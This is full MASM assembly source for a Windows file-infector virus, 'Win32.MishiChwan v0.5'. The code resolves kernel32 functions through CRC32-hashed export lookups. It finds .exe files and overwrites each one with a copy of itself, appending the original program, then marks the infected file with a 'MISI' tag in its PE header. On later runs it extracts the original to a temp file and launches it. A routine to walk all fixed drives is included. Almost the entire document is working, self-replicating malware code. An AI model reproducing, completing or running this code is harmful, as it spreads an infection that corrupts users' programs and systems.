TITLE Win32 Mishi Chwan (win32.mishichwan.asm)

;========================================================
; File Infector prepending for x86 32 bit architecture
; only valid for exe files
;
;
;========================================================

; COMPILER OPTIONS
.486
.model flat, stdcall
option casemap :none
assume fs:nothing

; LIBRARY INCLUDES
include f:\masm32\include\windows.inc
include f:\masm32\include\masm32.inc
include f:\masm32\include\kernel32.inc
include f:\masm32\include\user32.inc

includelib f:\masm32\lib\masm32.lib
includelib f:\masm32\lib\kernel32.lib
includelib f:\masm32\lib\user32.lib

; PROTOTYPES
CopyYourselfMyFriend PROTO :DWORD
GetDllBase PROTO :DWORD
GetPEHeader PROTO :DWORD
crc32Cipher PROTO :DWORD,:DWORD
mystrlen PROTO :DWORD
strstr  PROTO :DWORD, :DWORD
CreateExistingFileWrapper PROTO :DWORD
CreateExistingToWriteWrapper PROTO :DWORD
CreateNewFileWrapper PROTO :DWORD
VirtualAllocWrapper PROTO :DWORD

GetKernel32Exports PROTO
GiveMeGetProcAddress PROTO
GiveMeLoadLibraryA PROTO
GiveMeKernel32APIs PROTO

CheckIfImInfected PROTO
StartProcess PROTO

GoThroughTheFireAndTheFlames PROTO
GetExeFiles PROTO
infect_file PROTO
; BINARY SECTIONS
.code

_START:
    ; get kernel32 from stack
    pop ebx

    invoke VirtualProtect, offset _START, 1, PAGE_EXECUTE_READWRITE, esp

    ; get my imports

    ; get kernel32 base
    invoke GetDllBase, ebx
    mov [MZKernel32], eax
    ; kernel32 nt header
    invoke GetPEHeader, eax
    mov [PEKernel32], eax
    ; get export table information
    invoke GetKernel32Exports
    ; get LoadLibraryA
    invoke GiveMeLoadLibraryA
    ; get GetProcAddress
    invoke GiveMeGetProcAddress
    ; get APIs
    invoke GiveMeKernel32APIs


    ; check if I'm infected and if I am, start real process
    invoke CheckIfImInfected


    ; go to infect new files
    invoke GetExeFiles

    ; finally just show sign
    .if dword ptr [ImTheNumberOne] == TRUE
        jmp _final_countdown
    .else
        jmp _last_exit
    .endif

    title_          BYTE                'System Info#+ [Win32.MishiChwan v0.5]',0
    sign            BYTE                '(C)    2019 Mr. Zar',0
    stShellAbout    BYTE                'ShellAboutA',0
    stShell32       BYTE                'Shell32',0

    _final_countdown:
        push OFFSET stShell32
        call [ddLoadLibraryA]

        push OFFSET stShellAbout
        push eax
        call [ddGetProcAddress]

        push eax
        lea ebx, [sign]
        push ebx
        lea ebx,[title_]
        push ebx
        push NULL
        call eax
    _last_exit:
        push NULL
        call [ddExitThread]

_GENERIC_FUNCTIONS:
    CopyYourselfMyFriend proc newPath:DWORD
    ;=============================================
    ; Function to get my own path and copy to another
    ; location
    ; Parameters:
    ;       - newPath: string pointer to new path where to copy file
    ; Return:
    ;       - eax = 1 : everything correct
    ;       - eax = 0 : shitti pitty
    ;=============================================
        push MAX_PATH
        push OFFSET myFilePath
        push NULL
        call ddGetModuleFileNameA
        ; just copy the file to another location
        push TRUE
        push newPath
        push OFFSET myFilePath
        call ddCopyFileA

        ret
    CopyYourselfMyFriend endp

    GetDllBase proc dllAddress:DWORD
    ;===============================================================
    ; Function to get dll base address
    ; Parameters:
    ;       - dllAddress: random address from any dll to get base address
    ; Return:
    ;       - EAX = DLL base address : everything okay
    ;       - EAX = NULL : something bad happened
    ;===============================================================

        ;===============================================================
        ; modify seh handler so we have something in case of error
        ;===============================================================
        ; avoid program crashes as much as possible
        push offset SEH_Handler    ; pointer to my seh handler
        mov edx,fs:[0]             ; save pointer in edx
        push edx                   ; pointer to next handler
        mov fs:[0],esp

        jmp getBaseAddress

        SEH_Handler:
            mov     esi, dword ptr [esp + 0Ch] ; get CONTEXT
            
            mov     esp, dword ptr [esp + 8]
            mov     fs:[0], esp
            ; set again eax to continue searching
            mov     eax, dword ptr [esi + CONTEXT.regEax]
            sub     eax, 1000h
            ; set stack to avoid problems on return
            mov     esp, dword ptr [esi + CONTEXT.regEsp]
            mov     ebp, dword ptr [esi + CONTEXT.regEbp]
            
            jmp     _my_loop               

        getBaseAddress:
            mov eax, dllAddress
            and eax, 0FFFFF000h ; remove the low part

        _my_loop:
            .while word ptr [eax] != 'ZM'
                sub eax, 1000h
            .endw

        _getOut:
            mov edx,dword ptr[esp]
            mov fs:[0],edx
            add esp,8

            ret
    GetDllBase endp

    GetPEHeader proc dllBase:DWORD
    ;===============================================================
    ; Function to get PE header from dlls
    ; Parameters:
    ;   - dllBase: base of DLL to extract PE header
    ; Return:
    ;   - eax = Address of PE Header
    ;===============================================================
        mov edi,dllBase
        mov eax,[edi + IMAGE_DOS_HEADER.e_lfanew]
        add eax, edi
        ret
    GetPEHeader endp

    crc32Cipher proc strlength:DWORD, string:DWORD
    ;===============================================================
    ; CRC32 cipher for strings, this will be mainly used to
    ; get function names CRC.
    ; Parameters:
    ;       - strlength: length of string
    ;       - string: string to encode
    ; Return:
    ;       - eax = CRC32 of string : everything is okay
    ;===============================================================
        push ebx
        push ecx
        push edx
        push esi
        push edi

        mov esi, string
        mov ecx, strlength
        xor eax, eax
        cdq
        dec edx

        _load_byte:

            lodsb
            xor al, dl
            push ecx
            movzx ebx, al
            push 8
            pop ecx

        loc_401335:

            test bl, 1
            jz short loc_401344
            shr ebx, 1
            xor ebx, 0FEA36969h
            jmp short loc_401346

        loc_401344:
            shr ebx, 1

        loc_401346:

            loop loc_401335
            pop ecx
            shr edx, 8
            xor edx, ebx
            loop _load_byte
            xchg eax, edx
            not eax

            pop edi
            pop esi
            pop edx
            pop ecx
            pop ebx

            ret
    crc32Cipher endp

    mystrlen proc string:DWORD
    ;===============================================================
    ; simple function to count characters
    ; Parameters:
    ;       - string: string to count characters
    ; Return:
    ;       - eax = size of string
    ;===============================================================
        push ecx
        push esi

        xor ecx,ecx

        mov esi, string

        _next_character:
            lodsb
            test al,al
            jz _end_of_strlen

            inc ecx
            jmp _next_character

        _end_of_strlen:
            mov eax, ecx
            pop esi 
            pop ecx 

            ret
    mystrlen endp

    strstr  proc dst:DWORD, src:DWORD
    ;===============================================================
    ; Function to check if an string is inside of another
    ;===============================================================
        @1:     mov     ecx,src
                mov     edx,dst
        @2:     xor     eax,eax
                xor     al,[edx]
                jz      @5
                inc     edx
                sub     al,[ecx]
                jnz     @2
                mov     dst,edx
                inc     ecx
        @3:     xor     al,[ecx]
                jz      @4
                sub     al,[edx]
                jnz     @1
                inc     ecx
                inc     edx
                jmp     @3
        @4:     mov     eax,dst
                dec     eax
        @5:     ret
        strstr  endp

    CreateExistingFileWrapper proc filePath:DWORD
    ;===============================================================
    ; Wrapper for CreateFile so it will not be necessary to
    ; always call with many parameters
    ; Parameters:
    ;       - filePath: file path to open with CreateFile
    ; Return:
    ;       - eax = handler to file
    ;===============================================================
        push ecx

        xor ecx, ecx
        push ecx                ; hTemplateFile
        push ecx                ; dwFlagsAndAttributes
        push OPEN_EXISTING
        push ecx
        inc ecx
        push ecx                ; ecx = 1 = FILE_SHARE_READ
        push GENERIC_READ        
        push filePath           ; file to open
        call [ddCreateFile]

        pop ecx
        ret
    CreateExistingFileWrapper endp


    CreateExistingToWriteWrapper proc filePath:DWORD
    ;===============================================================
    ; Wrapper for CreateFile so it will not be necessary to
    ; always call with many parameters
    ; Parameters:
    ;       - filePath: file path to open with CreateFile
    ; Return:
    ;       - eax = handler to file
    ;===============================================================
        push ecx

        xor ecx, ecx
        push ecx                ; hTemplateFile
        push ecx                ; dwFlagsAndAttributes
        push OPEN_EXISTING
        push ecx
        inc ecx
        push ecx                ; ecx = 1 = FILE_SHARE_READ
        push GENERIC_WRITE        
        push filePath           ; file to open
        call [ddCreateFile]

        pop ecx
        ret
    CreateExistingToWriteWrapper endp

    CreateNewFileWrapper proc filePath:DWORD
    ;===============================================================
    ; Wrapper for CreateFile so it will not be necessary to
    ; always call with many parameters
    ; Parameters:
    ;       - filePath: file path to open with CreateFile
    ; Return:
    ;       - eax = handler to file
    ;===============================================================
        push ecx

        xor ecx, ecx
        push ecx                ; hTemplateFile
        push ecx                ; dwFlagsAndAttributes
        push CREATE_ALWAYS
        push ecx
        push ecx               
        push GENERIC_WRITE        
        push filePath           ; file to open
        call [ddCreateFile]

        pop ecx
        ret
    CreateNewFileWrapper endp

    VirtualAllocWrapper proc virtualSize:DWORD
    ;===============================================================
    ; Wrapper for VirtualAlloc
    ; Parameters:
    ;       - virtualSize: size to allocate
    ; Return:
    ;       - eax = handler to memory
    ;===============================================================
        
        push PAGE_EXECUTE_READWRITE
        push 00003000h                  ; MEM_COMMIT | MEM_RESERVE
        push virtualSize
        push NULL
        call ddVirtualAlloc

        ret
    VirtualAllocWrapper endp
_KERNEL32_STUFF:
    GetKernel32Exports proc
    ;===============================================================
    ; Function to get export information from Kernel32, 
    ; this will be used to get Kernel32 functions later
    ;===============================================================
        push edi
        push eax
        push esi 
        push edx

        mov edi, [MZKernel32]
        mov eax, [PEKernel32]

        ; get export table address
        mov esi, [eax + 78h] ; we could use structures but it would be harder
                             ; in x86 32 bit binaries we know adding 78h we have
                             ; export table in data directory, and there the RVA
        lea esi, [esi + edi]
        mov [K32ExportTable], esi

        mov edx, [esi + IMAGE_EXPORT_DIRECTORY.AddressOfNames] ; address of names
        lea edx, [edx + edi]
        mov [K32AddressOfNames], edx

        mov edx, [esi + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals] ; address of ordinals
        lea edx, [edx + edi]
        mov [K32AddressOfOrdinals], edx

        mov edx, [esi + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions] ; address of functions
        lea edx, [edx + edi]
        mov [K32AddressOfFunctions], edx

        pop edx
        pop esi 
        pop eax
        pop edi
        ret
    GetKernel32Exports endp 

    GiveMeGetProcAddress proc 
    ;===============================================================
    ; Function to get GetProcAddress (easy pisi)
    ;===============================================================
        mov edx, [K32AddressOfNames]
        mov edi, [MZKernel32]

        xor ecx, ecx

        ;===============================================================
        ;                   Obtención offset
        ;===============================================================
        myloop:
            mov ebx, dword ptr [edx] ; some name's offset
            add ebx, edi             ; string address

            invoke mystrlen, ebx

            invoke crc32Cipher, eax, ebx

        .if eax != 06DC632B7h ; compare with GetProcAddress
            add edx, 4h
            inc ecx
            jmp myloop
        .else
            ; Now in ECX we have the GetProcAddress index
            rol ecx, 1h                     ; multiply by 2
            mov edx, [K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]       ; function address offset
            
            mov edx, [K32AddressOfFunctions]
            rol ecx,2h                      ; multiply ecx by 4
            add edx, ecx                    ; Address offset
            mov eax, dword ptr [edx]
            add eax, edi                    ; add kernel32 base address
            
            mov [ddGetProcAddress],eax
        .endif
            ret
    GiveMeGetProcAddress endp


    GiveMeLoadLibraryA proc 
    ;===============================================================
    ; Function to get LoadLibraryA (easy pisi)
    ;===============================================================
        mov edx, [K32AddressOfNames]
        mov edi, [MZKernel32]

        xor ecx, ecx

        ;===============================================================
        ;                   Obtención offset
        ;===============================================================
        myloop:
            mov ebx, dword ptr [edx] ; some name's offset
            add ebx, edi             ; string address

            invoke mystrlen, ebx

            invoke crc32Cipher, eax, ebx

        .if eax != 01B4000AFh ; compare with LoadLibraryA
            add edx, 4h
            inc ecx
            jmp myloop
        .else
            ; Now in ECX we have the GetProcAddress index
            rol ecx, 1h                     ; multiply by 2
            mov edx, [K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]       ; function address offset
            
            mov edx, [K32AddressOfFunctions]
            rol ecx,2h                      ; multiply ecx by 4
            add edx, ecx                    ; Address offset
            mov eax, dword ptr [edx]
            add eax, edi                    ; add kernel32 base address
            
            mov [ddLoadLibraryA],eax
        .endif
            ret
    GiveMeLoadLibraryA endp

    GiveMeKernel32APIs proc 
    ;===============================================================
    ; Function to get all Kernel32 APIs
    ;===============================================================
        
        lea esi, [stringsKernel32]
        lea edi, [ddFindFirst]

        takeHash:
            cmp dword ptr [esi],000000000h
            je _end

            mov edx, [K32AddressOfNames]
            xor ecx, ecx
        _my_loop:
            
            mov ebx, dword ptr [edx] ; name's offset
            add ebx, [MZKernel32] ; strings' offset

            push ebx
            call mystrlen

            push ebx
            push eax
            call crc32Cipher

            cmp eax, [esi] ; check with hash
            jnz _go_next_function
            jmp _hash_correct
        _go_next_function:
            add edx, 4h ; if hash is not the same, go to next name
            inc ecx
            jmp _my_loop
        _hash_correct:
            rol ecx, 1h ; if hash is the same, take funciton address
            mov edx, [K32AddressOfOrdinals]
            add edx, ecx
            movzx ecx, word ptr [edx]

            mov edx, [K32AddressOfFunctions]
            rol ecx,2h
            add edx, ecx
            mov eax, dword ptr [edx]
            add eax, [MZKernel32]

            mov [edi], eax ; save function address in data

        next_one:
            add esi,4h
            add edi,4h
            jmp takeHash

        _end:
            ret
    GiveMeKernel32APIs endp

_VIRUS_FUNCTIONS:
    CheckIfImInfected proc
    ;===============================================================
    ; Function to check if I'm infected, in case I'm not the first virus 
    ; I have to create a Thread to execute the real file
    ;===============================================================
        LOCAL threadID:DWORD

        push NULL
        call [ddGetModuleHandleA]

        mov ebx, eax

        invoke GetPEHeader, eax

        add eax, 04Ch
        mov ecx, eax
        sub ecx, ebx

        mov [offsetToMISI], ecx ; it will be useful later

        .if dword ptr [eax] != 'MISI'      ; check the mark in Win32VersionValue header
            mov [ImTheNumberOne], TRUE
            xor eax, eax
        .else
            xor ecx,ecx
            lea esi,[threadID]
            push esi                    ; thread ID
            push ecx                    ; creational flag
            push ecx                    ; input data
            push StartProcess           ; start address
            push ecx                    ; stack size
            push ecx                    ; security attributes
            call ddCreateThread
        .endif

        ret
    CheckIfImInfected endp

    StartProcess proc
    ;===============================================================
    ; Function to start another process in allocated memory through
    ; a user mode loader, the file will be in our overlay.
    ;===============================================================
        ; first of all, get some data to go at the end 
        ; of this file
        _open_file:
            push MAX_PATH
            push OFFSET myFilePath
            push NULL
            call ddGetModuleFileNameA

            push OFFSET myFilePath
            call CreateExistingFileWrapper
            mov [handlerToInfectedFile], eax

        _read_file_on_allocated_memory:
            push OFFSET lpFileSizeHigh
            push eax
            call ddGetFileSize
            mov [sizeInfectedFile], eax
            invoke VirtualAllocWrapper, eax
            mov [VMInfectedFile], eax
            mov esi, eax

            push NULL
            push OFFSET lpNumberOfBytesWritten
            push sizeInfectedFile
            push esi
            push handlerToInfectedFile
            call ddReadFile

            mov eax, [handlerToInfectedFile]
            push eax
            call ddCloseHandle

        _point_to_end_of_file:

            invoke GetPEHeader, esi
            mov edi, eax ; edi = PE Header
            add edi, SIZEOF DWORD ; edi = IMAGE_FILE_HEADER

            xor ebx,ebx

            mov bx, word ptr  [edi + IMAGE_FILE_HEADER.SizeOfOptionalHeader]
            mov cx, word ptr [edi + IMAGE_FILE_HEADER.NumberOfSections]

            add edi, SIZEOF IMAGE_FILE_HEADER ; edi = IMAGE_OPTIONAL_HEADER
            add edi, ebx ; edi now points to sections

            dec cx
            .while cx != 0
                add edi, SIZEOF IMAGE_SECTION_HEADER
                dec cx
            .endw

            add esi, [edi + IMAGE_SECTION_HEADER.PointerToRawData]
            add esi, [edi + IMAGE_SECTION_HEADER.SizeOfRawData]

        _point_to_MZ_header:
            .while word ptr [esi] != 'ZM'
                inc esi
            .endw
            ; now esi point to infected file
            mov [VMInfectedFileMoved], esi

            mov eax, [VMInfectedFile]
            mov ebx, esi
            sub ebx, eax                ; now ebx is the size of the virus
                                        ; to get infected file size, just
                                        ; sub this value to file size
            mov eax, [sizeInfectedFile]
            sub eax, ebx                ; eax now is real size of infected file
            mov [InfectedFileRealSize], eax
        _get_new_path:

            push OFFSET path
            push MAX_PATH
            call ddGetTempPath

            push OFFSET temporalFilePath
            push 0
            push OFFSET PrefixString
            push OFFSET path
            call ddGetTempFileName

        _create_and_copy_content:

            push OFFSET temporalFilePath
            call CreateNewFileWrapper
            mov [temporalFileHandler], eax

            mov ebx, [temporalFileHandler]
            mov ecx, [InfectedFileRealSize]
            mov esi, [VMInfectedFileMoved]

            push NULL
            push OFFSET lpNumberOfBytesWritten
            push ecx
            push esi
            push ebx
            call ddWriteFile

            push ebx
            call ddCloseHandle

            mov ebx, [VMInfectedFile]
            mov ecx, [sizeInfectedFile]

            push MEM_RELEASE
            push ecx
            push ebx
            call ddVirtualFree
        _create_new_process_for_file:
            mov [info.cb], SIZEOF STARTUPINFOA

            push OFFSET procinf
            push OFFSET info
            push NULL
            push NULL
            push 0
            push FALSE
            push NULL
            push NULL
            push OFFSET temporalFilePath
            push NULL
            call ddCreateProcess

            push INFINITE
            push [procinf.hProcess]
            call ddWaitForSingleObject

        _delete_file_at_the_end:
            push OFFSET path
            call ddDeleteFile

        ret
    StartProcess endp

_GO_THROUGH_THE_COMPUTER:
    GoThroughTheFireAndTheFlames proc
    ;===============================================================
    ; Function to go through the file system searching files
    ; to infect, so those files will be executable files and
    ; must be for x86 architecture
    ;===============================================================
        _callDriveStrings:
            ; Get all the logic devices with GetLogicalDriveStringsA
            lea ecx, [DisksStrings]
            push ecx
            push 64h
            call [ddGetLogicalDriveStrings]
            lea edi, [DisksStrings]

        _getDiskType:
            push edi
            call [ddGetDriveType]

            cmp al, DRIVE_FIXED
            jnz _isNotDriveFixed

            ; set this directory as new directory
            push edi
            call [ddSetCurrentDirectory]
            call GetExeFiles
            lea esi, [_isNotDriveFixed]
            push esi

        ; Get first directory
        _searchDirectories:
            lea esi, [FindFolders]
            push esi
            lea esi, [allMask]
            push esi
            call [ddFindFirst]
            or eax, eax
            jz _fuckingEnd

            ; save handle
            mov [handleSearchAll], eax

        _checkIfDirectory:
            lea esi, [FindFolders.cFileName]
            test [FindFolders.dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
            jnz _IsDirectory
            jmp _goToNextFile

        _IsDirectory:
            cmp byte ptr [esi], '.' ; check if it is this directory
            je _goToNextFile
            ; set the new directory
            push esi
            call [ddSetCurrentDirectory]
            or eax, eax
            jz _goToNextFile

            invoke GetExeFiles
            mov ecx, [handleSearchAll]
            push ecx
            call _searchDirectories
            pop [handleSearchAll]

        _goToNextFile:
            ; go to next file and check if directory
            lea ecx, [FindFolders]
            push ecx
            mov ecx, [handleSearchAll]
            push ecx
            call [ddFindNext]
            test eax, eax
            jnz _checkIfDirectory

        _goToFather:
            ; go to parent folder and
            ; go to hell
            lea ecx, [parentFolder]
            push ecx
            call [ddSetCurrentDirectory]
            mov ecx, [handleSearchAll]
            push ecx
            call [ddFindClose]
            jmp _fuckingEnd

        _isNotDriveFixed:
            ; go to next drive
            add edi, 4
            cmp byte ptr [edi], 0
            ; if there are disks see the drive type
            jne _getDiskType

        _fuckingEnd:
            ret
    GoThroughTheFireAndTheFlames endp

    GetExeFiles proc
    ;===============================================================
    ; Function to get exe files from a folder,
    ; we will only take those for x86 32 bit architecture
    ;===============================================================
        pushad

        push MAX_PATH
        push OFFSET myFilePath
        push NULL
        call ddGetModuleFileNameA

        ; search for exe files
        _searchExeFiles:
            lea esi, [FindExecutables]
            push esi
            lea esi, [ExeMask]
            push esi
            call [ddFindFirst]
            mov [handleSearchExe], eax
            .if eax != INVALID_HANDLE_VALUE
                .while eax != FALSE
                    
                    lea ebx, [FindExecutables.cFileName]
                    push ebx
                    push OFFSET myFilePath
                    call strstr

                    .if eax != NULL
                        jmp _go_next_file
                    .endif

                    mov esi, [FindExecutables.dwFileAttributes]
                    mov [previousAttributes], esi
                    mov [FindExecutables.dwFileAttributes], FILE_ATTRIBUTE_NORMAL
                    call infect_file
                    mov esi, [previousAttributes]
                    mov [FindExecutables.dwFileAttributes], esi

                _go_next_file:
                    lea esi, [FindExecutables]
                    push esi
                    mov esi, [handleSearchExe]
                    push esi
                    call [ddFindNext]

                .endw
            .endif

        _exitFunction:
            mov esi, [handleSearchExe]
            push esi
            call [ddFindClose]
            popad
            ret
    GetExeFiles endp

    infect_file proc
    ;===============================================================
    ; Function to finally infect a file
    ;===============================================================
        _open_file:
            lea ebx, [FindExecutables.cFileName]

            push ebx
            call CreateExistingFileWrapper
            mov [handlerFileToInfect], eax
            push OFFSET lpFileSizeHigh
            push eax
            call ddGetFileSize
            mov [sizeToInfect], eax
        _create_memory_to_save_file:
            push eax
            call VirtualAllocWrapper
            mov [VMToInfect], eax

            mov ebx, [handlerFileToInfect]
            mov ecx, [sizeToInfect]

            push NULL
            push OFFSET lpNumberOfBytesWritten
            push ecx
            push eax
            push ebx
            call ddReadFile

            push handlerFileToInfect
            call ddCloseHandle

        _check_if_x86_32bits:
            mov esi, [VMToInfect]

            mov edi, [esi + IMAGE_DOS_HEADER.e_lfanew]
            add edi, esi
            add edi, SIZEOF DWORD
            add edi, SIZEOF IMAGE_FILE_HEADER
            ; check is 32 bit binary
            .if word ptr [edi + IMAGE_OPTIONAL_HEADER32.Magic] != IMAGE_NT_OPTIONAL_HDR32_MAGIC
                jmp _flush_it_out
            .endif

            .if dword ptr [edi + IMAGE_OPTIONAL_HEADER32.Win32VersionValue] == 'MISI'
                jmp _flush_it_out
            .endif

        _replace_file:
            lea ebx, [FindExecutables.cFileName]
            push ebx
            call ddDeleteFile
            lea ebx, [FindExecutables.cFileName]
            push ebx
            call CopyYourselfMyFriend

        _write_infected_file_at_the_end:
            lea ebx, [FindExecutables.cFileName]
            push ebx
            call CreateExistingToWriteWrapper
            mov [handlerFileToInfect], eax

            xor ecx, ecx

            push FILE_END
            push OFFSET lpDistanceHigh
            push ecx
            push eax
            call ddSetFilePointer

            mov ebx, [handlerFileToInfect]
            mov ecx, [sizeToInfect]
            mov esi, [VMToInfect]

            push NULL
            push OFFSET lpNumberOfBytesWritten
            push ecx
            push esi
            push ebx
            call ddWriteFile

        _write_sign:
            mov ebx, [handlerFileToInfect]
            mov ecx, [offsetToMISI]

            push FILE_BEGIN
            push OFFSET lpDistanceHigh
            push ecx
            push ebx
            call ddSetFilePointer

            push NULL
            push OFFSET lpNumberOfBytesWritten
            push SIZEOF DWORD
            push OFFSET MISISign
            push ebx
            call ddWriteFile

            push ebx
            call ddCloseHandle

        _flush_it_out:
            push MEM_RELEASE
            push sizeToInfect
            push VMToInfect
            call ddVirtualFree

        ret
    infect_file endp
_MY_DATA:
    ;=============================================
    ; Data part inside of code section
    ;=============================================

    ; virus information 
    longVirus               EQU                        _VIREND - _START
    myFilePath              BYTE MAX_PATH              dup(0)
    ImTheNumberOne          DWORD                      0

    ; Some necessary data for execution
    handlerToInfectedFile   DWORD                      0
    sizeInfectedFile        DWORD                      0
    VMInfectedFile          DWORD                      0
    VMInfectedFileMoved     DWORD                      0

    InfectedFileRealSize    DWORD                      0 ; this will be set by virus

    lpFileSizeHigh          DWORD                      0
    ; temporary file data
    path                    BYTE MAX_PATH              dup(0)
    temporalFilePath        BYTE MAX_PATH              dup(0)
    PrefixString            BYTE                       '.MISHICHWAN',0
    temporalFileHandler     DWORD                      0
    info                    STARTUPINFOA               <>
    procinf                 PROCESS_INFORMATION        <>
    lpNumberOfBytesWritten  DWORD                      0

    ; data to infect
    pathToInfect            BYTE                       '.'
    temporalFileToInfect    BYTE MAX_PATH              dup(0)
    handlerFileToInfect     DWORD                      0
    VMToInfect              DWORD                      0
    sizeToInfect            DWORD                      0
    lpDistanceHigh          DWORD                      0
    offsetToMISI            DWORD                      0
    MISISign                DWORD                      'MISI'

    

    ; Some Kernel32 data to be saved
    MZKernel32              DWORD                       0   
    PEKernel32              DWORD                       0
    K32ExportTable          DWORD                       0
    K32AddressOfNames       DWORD                       0
    K32AddressOfOrdinals    DWORD                       0
    K32AddressOfFunctions   DWORD                       0
    ; Functions to load other functions
    ddLoadLibraryA          DWORD                       ?
    ddGetProcAddress        DWORD                       ?

    ; Function addresses
    ddFindFirst             DWORD                       ?
    ddFindNext              DWORD                       ?
    ddCreateFile            DWORD                       ?
    ddCloseHandle           DWORD                       ?
    ddGetModuleHandleA      DWORD                       ?
    ddExitProcess           DWORD                       ?
    ddCreateThread          DWORD                       ?
    ddGetLogicalDriveStrings DWORD                      ?
    ddGetDriveType          DWORD                       ?
    ddSetCurrentDirectory   DWORD                       ?
    ddFindClose             DWORD                       ?
    ddGetModuleFileNameA    DWORD                       ?
    ddCopyFileA             DWORD                       ?
    ddVirtualAlloc          DWORD                       ?
    ddVirtualProtect        DWORD                       ?
    ddGetFileSize           DWORD                       ?
    ddGetTempPath           DWORD                       ?
    ddGetTempFileName       DWORD                       ?
    ddWriteFile             DWORD                       ?
    ddReadFile              DWORD                       ?
    ddCreateProcess         DWORD                       ?
    ddWaitForSingleObject   DWORD                       ?
    ddDeleteFile            DWORD                       ?
    ddVirtualFree           DWORD                       ?
    ddSetFilePointer        DWORD                       ?
    ddExitThread            DWORD                       ?
    ; strings encoded as crc32
    stringsKernel32         DWORD                       0628E4A72h ; FindFirstFileA
                            DWORD                       04C223B47h ; FindNextFileA
                            DWORD                       09E892CF0h ; CreateFileA
                            DWORD                       008D9419Bh ; CloseHandle
                            DWORD                       0BDE8F71Eh ; GetModuleHandleA
                            DWORD                       0AE0C449Ch ; ExitProcess
                            DWORD                       0CE47F774h ; CreateThread
                            DWORD                       0A2331A6Eh ; GetLogicalDriveStringsA
                            DWORD                       0C4325A30h ; GetDriveTypeA
                            DWORD                       04383B271h ; SetCurrentDirectoryA
                            DWORD                       067067163h ; FindClose
                            DWORD                       0242F8AE9h ; GetModuleFileNameA
                            DWORD                       0316987FBh ; CopyFileA
                            DWORD                       081474E59h ; VirtualAlloc
                            DWORD                       0B6DB9D9Ch ; VirtualProtect
                            DWORD                       02F7EE082h ; GetFileSize
                            DWORD                       030980BF1h ; GetTempPathA
                            DWORD                       0FDA4B47Dh ; GetTempFileNameA
                            DWORD                       04A4ADFB5h ; WriteFile
                            DWORD                       01F13F215h ; ReadFile
                            DWORD                       08AAEFF6Ch ; CreateProcessA
                            DWORD                       0ED72B4FEh ; WaitForSingleObject
                            DWORD                       0AA81C26Ah ; DeleteFileA
                            DWORD                       01760D258h ; VirtualFree
                            DWORD                       0355C8957h ; SetFilePointer
                            DWORD                       0747455D3h ; ExitThread
                            DWORD                       000000000h ; Final

    ; data we will need to find files and open files
    FindExecutables         WIN32_FIND_DATAA            <>
    ExeMask                 BYTE                        '*.exe',0
    handleSearchExe         DWORD                       0
    previousAttributes      DWORD                       0
    handleOpenExe           DWORD                       0
    handleMem               DWORD                       0

    ; Information to use on directory search and open them
    DisksStrings            BYTE 101                    DUP (0) ; here we will save the string with activated disks
    FindFolders             WIN32_FIND_DATAA            <>
    allMask                 BYTE                        '*.*',0
    handleSearchAll         DWORD                       0
    parentFolder            BYTE                        '..',0



_VIREND:
end _START
